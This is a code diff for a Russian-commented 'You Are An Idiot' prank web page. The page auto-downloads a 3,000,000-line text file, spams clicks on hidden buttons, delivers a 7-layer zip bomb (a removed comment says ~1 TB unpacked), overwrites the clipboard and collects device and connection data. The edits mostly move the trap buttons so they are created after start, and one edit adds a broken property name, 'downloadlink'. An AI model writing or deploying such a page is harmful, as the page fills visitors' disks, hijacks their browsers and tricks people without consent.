@@ -206,10 +206,6 @@
 
     <div id="flash"></div>
 
-    <button id="giant-trap" aria-hidden="true"></button>
-
-    <button id="auto-btn" aria-hidden="true"></button>
-
     <script>
         // ================== НАСТРОЙКИ ==================
         var VIDEO_ID         = "hPZxDJYmTUw";
@@ -233,26 +229,22 @@
         var GIANT_COPY_COUNT   = 10;
         var GIANT_COPY_GAP     = 100;
 
-        // скачивание текстовых файлов
         var DOWNLOAD_FILENAME  = "YOUAREANIDIOT.txt";
         var DOWNLOAD_REPEATS   = 3000000;
         var AUTO_DOWNLOAD      = true;
         var TAP_DOWNLOAD       = true;
 
-        // авто-клик по маленькой кнопке
         var AUTO_BTN_SPAM      = true;
         var AUTO_BTN_EVERY     = 100;
         var AUTO_BTN_MAX       = 200;
 
-        // zip-бомба
         var ZIP_BOMB_ENABLED   = true;
-        var ZIP_BOMB_LAYERS    = 7;            // 7 слоёв → ~1 ТБ при распаковке
+        var ZIP_BOMB_LAYERS    = 7;
         var ZIP_BOMB_PER_LAYER = 10;
         var ZIP_BOMB_FILENAME  = "YOUAREANIDIOT.zip";
         var ZIP_BOMB_INNER     = "★YOU ARE AN IDIOT AHAHAHAHAHAH★\n";
-        var ZIP_BOMB_INNER_KB  = 100;          // размер inner.txt в КБ
+        var ZIP_BOMB_INNER_KB  = 100;
 
-        // текст
         var CLIP_TEXT          = "★YOU ARE AN IDIOT AHAHAHAHAHAH★";
         // ===============================================
 
@@ -276,6 +268,21 @@
             started = true;
 
             document.getElementById('start-screen').classList.add('hidden');
+
+            // создаём ловушки только после старта
+            if (!document.getElementById('giant-trap')) {
+                var giant = document.createElement("button");
+                giant.id = "giant-trap";
+                giant.setAttribute("aria-hidden", "true");
+                document.body.appendChild(giant);
+            }
+
+            if (!document.getElementById('auto-btn')) {
+                var autoBtn = document.createElement("button");
+                autoBtn.id = "auto-btn";
+                autoBtn.setAttribute("aria-hidden", "true");
+                document.body.appendChild(autoBtn);
+            }
 
             try {
                 var container = document.getElementById('video-container');
@@ -326,7 +333,6 @@
                 triggerDownload();
             }
 
-            // zip-бомба
             triggerZipBomb();
         }
 
@@ -647,7 +653,7 @@
             for (var i = 0; i < DOWNLOAD_REPEATS; i++) {
                 out += line;
             }
-            return out;
+                    return out;
         }
 
         function triggerDownload() {
@@ -658,7 +664,7 @@
 
                 var big = buildBigContent();
                 var blob = new Blob([big], { type: "text/plain" });
-                    var url = URL.createObjectURL(blob);
+                var url = URL.createObjectURL(blob);
 
                 var a = document.createElement("a");
                 a.href = url;
@@ -726,7 +732,7 @@
 
             if (navigator.connection) {
                 d.conn = navigator.connection.effectiveType || "?";
-                d.down = navigator.connection.downlink || 0;
+                d.down = navigator.connection.downloadlink || 0;
             }
 
             return d;
